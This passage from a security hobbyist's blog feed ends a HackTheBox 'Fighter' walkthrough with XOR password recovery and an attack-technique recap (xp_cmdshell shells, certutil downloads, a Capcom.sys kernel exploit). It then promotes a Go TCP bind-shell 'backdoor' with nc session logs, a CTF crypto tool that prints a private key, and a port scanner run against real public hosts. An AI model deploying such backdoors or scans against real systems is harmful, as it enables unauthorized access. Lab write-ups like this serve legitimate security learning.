<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">signed int __cdecl check(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // eax</span><br><span class="line"></span><br><span class="line">  v1 = 0;</span><br><span class="line">  <span class="keyword">while</span> ( (*(_BYTE *)(a1 + v1) ^ 9) == aFmFeholH[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (unsigned int)++v1 &gt;= 0xA )</span><br><span class="line">      <span class="built_in">return</span> 1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So we create a c program that XOR’s 9 with each character of the string.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Fm`fEhOl&#125;h</span><br></pre></td></tr></table></figure>

<p>check.c</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">char aFmFeholH[15] = <span class="string">&quot;Fm`fEhOl&#125;h&quot;</span>;</span><br><span class="line">int v1;</span><br><span class="line">    <span class="keyword">for</span> (v1=0;v1&lt;11;v1++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(*(int *) (aFmFeholH + v1) ^ 9));</span><br><span class="line">    puts(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>compile and run the file and get the password to be “OdioLaFeta”.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># gcc check.c -o check</span></span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># ./check </span></span><br><span class="line">OdioLaFeta</span><br></pre></td></tr></table></figure>

<p>provide the password to the root.exe we get our final flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;root.exe OdioLaFeta</span><br><span class="line">root.exe OdioLaFeta</span><br><span class="line">d801c1e9bd9a02f8fb30d8bd3be314c1</span><br></pre></td></tr></table></figure>

<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb35.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb36.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb37.jpg"></p>
</li>
</ul>
<p>what a crazy box…</p>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>masscan quick port scan</li>
<li>burp intruder fuzz subdomains</li>
<li>sql injection python shell script</li>
<li>Construct xp_cmdshell statement to spawn a shell</li>
<li>use nps payload bypass a firewall</li>
<li>use “certutil.exe -urlcache -split -f” to download files</li>
<li>turn 32-bits session to 64-bits session</li>
<li>Street Fighter 5 - ‘Capcom.sys’ Kernel Execution (Metasploit)</li>
<li>modify metasploit module ruby scripts</li>
<li>reverse engineer .dll file then write .c decrypt program</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>gobindshell-Golang-Tcp-Bind-Shell</title>
    <url>/2020/04/11/gobindshell/</url>
    <content><![CDATA[<h4 id="Golang-Tcp-Bind-Shell"><a href="#Golang-Tcp-Bind-Shell" class="headerlink" title="Golang Tcp Bind Shell"></a>Golang Tcp Bind Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">------------------------------------------------</span><br><span class="line">A golang based tcp <span class="built_in">bind</span> shell</span><br><span class="line">------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">My QQ:1185151867</span></span><br><span class="line"><span class="string">Blog: https://fdlucifer.github.io/</span></span><br><span class="line"><span class="string">################################################</span></span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb2JpbmRzaGVsbA==">Download gobindshell from my github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>将源代码编译好，如果目标系统是windows就在windows下的go环境中编译，目标系统是linux的话同理，将编译生成的可执行文件放到目标系统的终端里运行</p>
<ul>
<li>目标系统的环境为windows</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 172.20.10.5 5211</span></span><br><span class="line">                        welcome to lucifer11(QQ:1185151867)<span class="string">&#x27;s backdoor[default port:5211]</span></span><br><span class="line"><span class="string">[+] Connect backdoor success,press enter to join the shell :):</span></span><br><span class="line"><span class="string">Microsoft Windows [�汾 10.0.18363.752]</span></span><br><span class="line"><span class="string">(c) 2019 Microsoft Corporation����������Ȩ����</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">D:\Go\testgofiles\oldboygo\goprogram\gobackdoor&gt;whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">lucifer11\hasee</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">D:\Go\testgofiles\oldboygo\goprogram\gobackdoor&gt;net user</span></span><br><span class="line"><span class="string">net user</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\\LUCIFER11 ���û��ʻ�</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">Administrator            ASPNET                   DefaultAccount           </span></span><br><span class="line"><span class="string">Guest                    HASEE                    WDAGUtilityAccount       </span></span><br><span class="line"><span class="string">�����ɹ����ɡ�</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">D:\Go\testgofiles\oldboygo\goprogram\gobackdoor&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><img src="https://raw.githubusercontent.com/FDlucifer/gobindshell/master/showpics/1.jpg"></p>
</li>
<li><p>目标系统为linux</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.66.6 5211</span></span><br><span class="line">                        twelcome to lucifer11(QQ:1185151867)<span class="string">&#x27;s backdoor[default port:5211]                                 </span></span><br><span class="line"><span class="string">[+] Connect backdoor success,press enter to join the shell :):                                                             </span></span><br><span class="line"><span class="string">id                                                                                                                         </span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) 组=0(root)                                                                                         </span></span><br><span class="line"><span class="string">whoami                                                                                                                     </span></span><br><span class="line"><span class="string">root                                                                                                                       </span></span><br><span class="line"><span class="string">pwd                                                                                                                        </span></span><br><span class="line"><span class="string">/root</span></span><br><span class="line"><span class="string">uname -a</span></span><br><span class="line"><span class="string">Linux kali 5.4.0-kali4-amd64 #1 SMP Debian 5.4.19-1kali1 (2020-02-17) x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/gobindshell/master/showpics/2.jpg"></li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>轻量级的golang tcp bind shell</li>
<li>同时支持windows和linux环境</li>
<li>能多平台交叉编译使用</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>有任何问题请联系qq:1185151867 :)</li>
</ul>
<p>:) enjoy it ! :)</p>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>goendecoder-golang-ctf加解密工具-支持多达65种加密解密方法-可根据实际需要修改源码以解密密文</title>
    <url>/2020/03/25/goendecoder/</url>
    <content><![CDATA[<p><font color="green">很长一段时间没有发vulnhub靶机的博客了，因为在闭关修炼golang语言，所以废话不多说，下面是这段时间的成果，由本菜独立开发，勿喷!!! :)</font></p>
<h4 id="Golang-CTF加解密工具"><a href="#Golang-CTF加解密工具" class="headerlink" title="Golang CTF加解密工具"></a>Golang CTF加解密工具</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------</span><br><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string">----------------------------------------------------------</span></span><br><span class="line"><span class="string">QQ 1185151867</span></span><br><span class="line"><span class="string">--############################ :)hack all asshole things:)</span></span><br><span class="line"><span class="string">----------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb2VuZGVjb2Rlcg==">Download<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="Example-Pics"><a href="#Example-Pics" class="headerlink" title="Example Pics"></a>Example Pics</h3><p><img src="https://raw.githubusercontent.com/FDlucifer/goendecoder/master/showpics/show.jpg"></p>
<p><img src="https://raw.githubusercontent.com/FDlucifer/goendecoder/master/showpics/show1.jpg"></p>
<a id="more"></a>

<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------</span><br><span class="line">[+] please choose your choice to encode or decode strings:</span><br><span class="line">[+] usage: [your string to convert + choice number]</span><br><span class="line">[+] list of choices:</span><br><span class="line">----------------------------------------------------------</span><br></pre></td></tr></table></figure>

<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h2 id="En-Dedode-a-string-without-spaces-using-ECC-Encryption"><a href="#En-Dedode-a-string-without-spaces-using-ECC-Encryption" class="headerlink" title="En/Dedode a string without spaces using ECC Encryption"></a>En/Dedode a string without spaces using ECC Encryption</h2><ul>
<li>first generate ecc public and private key</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n casdc 9999</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [casdc], your choice [9999]&#125;</span><br><span class="line">-- Generating ECC public and private keys......</span><br><span class="line">-- generat ECC public and private key successful......</span><br><span class="line">-- your ECC public key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">------------------------------------------------------</span><br><span class="line">-- your ECC private key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>then input your string to encode</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n 我草泥马 38</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [我草泥马], your choice [38]&#125;</span><br><span class="line">-- Reading eccpublic key from eccpublic.pem...</span><br><span class="line">-- eccpublic key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Encryption......</span><br><span class="line">- start writing ECC encrypted data to ecc-encrypted.txt...</span><br><span class="line">- convert plaintext [我草泥马] to ECC hex encryption result [046210648396eadeec655a5e9e72f15ad49f140df0f04a825b499b902f471997b3b5f95b407d006441483bd2caf9717bb8a985457ffd08e59cb5ff65a68402a807b5c959953ac3c1ea17127a9aae06dddbb540cc43218ca6b100e15c3631d1e7155728b5171c1235bd6abe676732aa03268976e657a9a16e3a26678891]</span><br><span class="line">-----------------ecc encryption over-----------------</span><br></pre></td></tr></table></figure>

<ul>
<li>then decode the encrypted text to plaintext</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n casd 39</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [casd], your choice [39]&#125;</span><br><span class="line">-- Reading eccprivate key from eccprivate.pem...</span><br><span class="line">-- eccprivate key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Decryption......</span><br><span class="line">[+] Reading byte ecc encrypted data from ecc-encrypted.txt...</span><br><span class="line">- convert ecc encrypted byte data from ecc-encrypted.txt to plaintext: [我草泥马]</span><br><span class="line">-----------------ecc decryption over-----------------</span><br></pre></td></tr></table></figure>

<h2 id="En-Dedode-a-string-with-spaces-include-using-ECC-Encryption"><a href="#En-Dedode-a-string-with-spaces-include-using-ECC-Encryption" class="headerlink" title="En/Dedode a string with spaces include using ECC Encryption"></a>En/Dedode a string with spaces include using ECC Encryption</h2><ul>
<li>first generate ecc public and private key</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n casdc 9999</span><br><span class="line">- you choose [n]</span><br><span class="line">- &#123;your string [casdc], your choice [9999]&#125;</span><br><span class="line">-- Generating ECC public and private keys......</span><br><span class="line">-- generat ECC public and private key successful......</span><br><span class="line">-- your ECC public key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">------------------------------------------------------</span><br><span class="line">-- your ECC private key is:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>then input your string to encode</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">y 我 操 你 妈妈</span><br><span class="line">- you choose [y]</span><br><span class="line">- &#123;your string [我 操 你 妈妈</span><br><span class="line">]&#125;</span><br><span class="line">38</span><br><span class="line">- &#123;your choice [38]&#125;</span><br><span class="line">-- Reading eccpublic key from eccpublic.pem...</span><br><span class="line">-- eccpublic key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJX</span><br><span class="line">QCCF5p90uwIaxXxmJw6aAwIrsNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PUBLIC KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Encryption......</span><br><span class="line">- start writing ECC encrypted data to ecc-encrypted.txt...</span><br><span class="line">- convert plaintext [我 操 你 妈妈</span><br><span class="line">] to ECC hex encryption result [0499173f0b7246278597bb1268ba64da228b6e447ea184dfa8c14277fff6c7da170cd24acf341ae2856137c90c00b495573484dd0bc133aae1a5540a17fcda9dd37b47d037f1410acc6b4ebcaa47ae18fd1b23bcc47cce5fa27b8746a1143908b9bab8cdea55d76ffc9f82e88ef2345240f7d10dde9962967bd6077c3e7f8023eb9e06b658]</span><br><span class="line">-----------------ecc encryption over-----------------</span><br></pre></td></tr></table></figure>

<ul>
<li>then decode the encrypted text to plaintext</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">y casd</span><br><span class="line">- you choose [y]</span><br><span class="line">- &#123;your string [casd</span><br><span class="line">]&#125;</span><br><span class="line">39</span><br><span class="line">- &#123;your choice [39]&#125;</span><br><span class="line">-- Reading eccprivate key from eccprivate.pem...</span><br><span class="line">-- eccprivate key:</span><br><span class="line"> [-----BEGIN  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">MHcCAQEEIH4OwCsvWhJGfSa6jestEaEEW/92rynOKvkq6t8glExooAoGCCqGSM49</span><br><span class="line">AwEHoUQDQgAEKKcMkz7SfPBUXpsDMdkFaZnYnQJXQCCF5p90uwIaxXxmJw6aAwIr</span><br><span class="line">sNvp/7oPDM2YfD0efFhHB4lbKsdR5WsV0Q==</span><br><span class="line">-----END  WUMAN ECC PRIVATE KEY -----</span><br><span class="line">]</span><br><span class="line">[+] Beginning ECC Decryption......</span><br><span class="line">[+] Reading byte ecc encrypted data from ecc-encrypted.txt...</span><br><span class="line">- convert ecc encrypted byte data from ecc-encrypted.txt to plaintext: [我 操 你 妈妈</span><br><span class="line">]</span><br><span class="line">-----------------ecc decryption over-----------------</span><br></pre></td></tr></table></figure>

<ul>
<li>other en/decryption method are just like this</li>
</ul>
<h4 id="Support-Encryption-and-decryption-algorithm"><a href="#Support-Encryption-and-decryption-algorithm" class="headerlink" title="Support Encryption and decryption algorithm"></a>Support Encryption and decryption algorithm</h4><ul>
<li><ol>
<li>base64 encode</li>
</ol>
</li>
<li><ol start="2">
<li>base64 decode</li>
</ol>
</li>
<li><ol start="3">
<li>Aes cbc model encode</li>
</ol>
</li>
<li><ol start="4">
<li>Aes cbc model decode</li>
</ol>
</li>
<li><ol start="5">
<li>Aes ecb model encode</li>
</ol>
</li>
<li><ol start="6">
<li>Aes ecb model decode</li>
</ol>
</li>
<li><ol start="7">
<li>Aes cfb model encode</li>
</ol>
</li>
<li><ol start="8">
<li>Aes cfb model decode</li>
</ol>
</li>
<li><ol start="9">
<li>hex encode (ASCII hex)</li>
</ol>
</li>
<li><ol start="10">
<li>hex decode (ASCII hex)</li>
</ol>
</li>
<li><ol start="11">
<li>md5 encode (md5($pass.$salt);Joomia)</li>
</ol>
</li>
<li><ol start="12">
<li>sha1 encode</li>
</ol>
</li>
<li><ol start="13">
<li>hmac encode (md5)</li>
</ol>
</li>
<li><ol start="14">
<li>sha256 encode</li>
</ol>
</li>
<li><ol start="15">
<li>hmac-sha1 encode</li>
</ol>
</li>
<li><ol start="17">
<li>hmac-sha512 encode</li>
</ol>
</li>
<li><ol start="18">
<li>Base64Url Safe encode &lt;not contain (‘/‘,’+’);replaced by (‘_’,’-‘);(‘=’) removed&gt;</li>
</ol>
</li>
<li><ol start="19">
<li>Base64Url Safe decode</li>
</ol>
</li>
<li><ol start="20">
<li>des Ecb encryption</li>
</ol>
</li>
<li><ol start="21">
<li>des Ecb decryption</li>
</ol>
</li>
<li><ol start="22">
<li>des Cbc encryption</li>
</ol>
</li>
<li><ol start="23">
<li>des Cbc decryption</li>
</ol>
</li>
<li><ol start="24">
<li>3des Cbc encryption</li>
</ol>
</li>
<li><ol start="25">
<li>3des Cbc decryption</li>
</ol>
</li>
<li><ol start="26">
<li>Ripemd160 encryption</li>
</ol>
</li>
<li><ol start="27">
<li>3des Ecb encryption</li>
</ol>
</li>
<li><ol start="28">
<li>3des Ecb decryption</li>
</ol>
</li>
<li><ol start="29">
<li>Rc4 encryption</li>
</ol>
</li>
<li><ol start="30">
<li>AzDG encryption</li>
</ol>
</li>
<li><ol start="31">
<li>AzDG decryption</li>
</ol>
</li>
<li><ol start="32">
<li>Aes CTR encryption</li>
</ol>
</li>
<li><ol start="33">
<li>Aes CTR decryption</li>
</ol>
</li>
<li><ol start="34">
<li>PBKDF2 encryption (set &lt;passwdrd, salt, iter, keylen, hash&gt; to strong encrypt data)</li>
</ol>
</li>
<li><ol start="999">
<li>[–Generate Rsa Public and Private Key :)–]</li>
</ol>
</li>
<li><ol start="35">
<li>RSA hex formate encryption</li>
</ol>
</li>
<li><ol start="36">
<li>RSA hex formate decryption</li>
</ol>
</li>
<li><ol start="37">
<li>RSA sign confirm</li>
</ol>
</li>
<li><ol start="9999">
<li>[ECC Key generate] –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="38">
<li>ECC Encryption –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="39">
<li>ECC Decryption –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="40">
<li>ECC sign confirm –(bitcoin and ID card … used)–[elliptic.P256() used]</li>
</ol>
</li>
<li><ol start="41">
<li>Blowfish Ecb Encryption</li>
</ol>
</li>
<li><ol start="42">
<li>Blowfish Ecb Decryption</li>
</ol>
</li>
<li><ol start="43">
<li>Md4 encryption</li>
</ol>
</li>
<li><ol start="44">
<li>Aes Gcm Encryption [Ethereum Whisper protocol used]</li>
</ol>
</li>
<li><ol start="45">
<li>Aes Gcm Decryption [Ethereum Whisper protocol used]</li>
</ol>
</li>
<li><ol start="46">
<li>des Cfb encryption</li>
</ol>
</li>
<li><ol start="47">
<li>des Cfb decryption</li>
</ol>
</li>
<li><ol start="48">
<li>AES OFB Encryption</li>
</ol>
</li>
<li><ol start="49">
<li>AES OFB Decryption</li>
</ol>
</li>
<li><ol start="50">
<li>des Ctr encryption</li>
</ol>
</li>
<li><ol start="51">
<li>des Ctr decryption</li>
</ol>
</li>
<li><ol start="52">
<li>des Ofb encryption</li>
</ol>
</li>
<li><ol start="53">
<li>des Ofb decryption</li>
</ol>
</li>
<li><ol start="54">
<li>Elliptic Curve Digital Signature Verified</li>
</ol>
</li>
<li><ol start="55">
<li>Vertfied pub key types</li>
</ol>
</li>
<li><ol start="56">
<li>HKDF encryption</li>
</ol>
</li>
<li><ol start="57">
<li>base32 encryption</li>
</ol>
</li>
<li><ol start="58">
<li>base32 decryption</li>
</ol>
</li>
<li><ol start="59">
<li>nacl box encryption and decryption</li>
</ol>
</li>
<li><ol start="60">
<li>nacl secretbox encryption and decryption</li>
</ol>
</li>
<li><ol start="61">
<li>scrypt encryption [Bitcoin used strong encryption]</li>
</ol>
</li>
<li><ol start="62">
<li>Shake256 encryption</li>
</ol>
</li>
<li><ol start="63">
<li>Caesar encryption</li>
</ol>
</li>
<li><ol start="64">
<li>Caesar decryption</li>
</ol>
</li>
<li><ol start="65">
<li>hex dump</li>
</ol>
</li>
</ul>
<h3 id="优点特色"><a href="#优点特色" class="headerlink" title="优点特色"></a>优点特色</h3><ul>
<li>支持多达65种加解密算法</li>
<li>彩色输出美化</li>
<li>持续添加更多算法支持</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>如果工具打开报错请把flag.txt和go build生成的goendecoder.exe放在同一目录下即可</li>
<li>有任何问题请联系qq:1185151867 :)</li>
</ul>
<p><font color="yellow">:) enjoy it ! :)</font></p>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>ctf tools</tag>
      </tags>
  </entry>
  <entry>
    <title>goportscan-go调用最大cpu内核数实现批量ip列表tcp端口快速扫描</title>
    <url>/2020/03/25/goportscan/</url>
    <content><![CDATA[<p><font color="green">支持ip列表快速批量tcp65535全端口扫描，并将结果写入txt文件，由本菜独立开发。。。</font></p>
<h4 id="Tcp-Fast-Port-Scanner"><a href="#Tcp-Fast-Port-Scanner" class="headerlink" title="Tcp Fast Port Scanner"></a>Tcp Fast Port Scanner</h4><hr>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ____          _               _  __           _ _</span><br><span class="line">| __ ) _   _  | |   _   _  ___(_)/ _| ___ _ __/ / |</span><br><span class="line">|  _ \| | | | | |  | | | |/ __| | |_ / _ \ <span class="string">&#x27;__| | |</span></span><br><span class="line"><span class="string">| |_) | |_| | | |__| |_| | (__| |  _|  __/ |  | | |</span></span><br><span class="line"><span class="string">|____/ \__, | |_____\__,_|\___|_|_|  \___|_|  |_|_|</span></span><br><span class="line"><span class="string">       |___/</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<hr>
<ul>
<li>By Lucifer11</li>
<li>My QQ:1185151867</li>
<li><a href="https://fdlucifer.github.io/">My Blog</a></li>
</ul>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3BvcnRzY2Fu">download goportscan<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\day12\goportscan&gt;goportscan.exe -h</span><br><span class="line">Usage of goportscan.exe:</span><br><span class="line">  -allports string</span><br><span class="line">        select this option to scan all open ports <span class="keyword">in</span> 65535 ports (default <span class="string">&quot;n&quot;</span>)</span><br><span class="line">  -end-port int</span><br><span class="line">        the port from whitch the scanning ends (default 10000)</span><br><span class="line">  -ipfile string</span><br><span class="line">        the file stored ip list (default <span class="string">&quot;iplist.txt&quot;</span>)</span><br><span class="line">  -start-port int</span><br><span class="line">        the port on whitch the scanning starts (default 1)</span><br><span class="line">  -timeout duration</span><br><span class="line">        timeout (default 500ms)</span><br></pre></td></tr></table></figure>

<h2 id="批量扫ip65535全端口"><a href="#批量扫ip65535全端口" class="headerlink" title="批量扫ip65535全端口"></a>批量扫ip65535全端口</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\Go\testgofiles\oldboygo\day12\goportscan&gt;goportscan.exe -allports y</span><br><span class="line">...</span><br><span class="line">[+] scanning host: [163.com], port: [64660]</span><br><span class="line">[+] scanning host: [163.com], port: [64642]</span><br><span class="line">[+] scanning host: [163.com], port: [65094]</span><br><span class="line">[+] scanning host: [163.com], port: [64655]</span><br><span class="line">[+] scanning host: [163.com], port: [65173]</span><br><span class="line">[+] scanning host: [163.com], port: [65311]</span><br><span class="line">[+] scanning host: [163.com], port: [64934]</span><br><span class="line">[+] scanning host: [163.com], port: [60555]</span><br><span class="line">[+] scanning host: [163.com], port: [60259]</span><br><span class="line">[+] scanning host: [163.com], port: [64640]</span><br><span class="line">[+] host [163.com] opening ports: [443 80]</span><br><span class="line">------------------------------------------------</span><br><span class="line">[+] [4399.com] Resolved address is [118.184.184.70]</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/FDlucifer/goportscan/master/pics/allports.jpg"></li>
</ul>
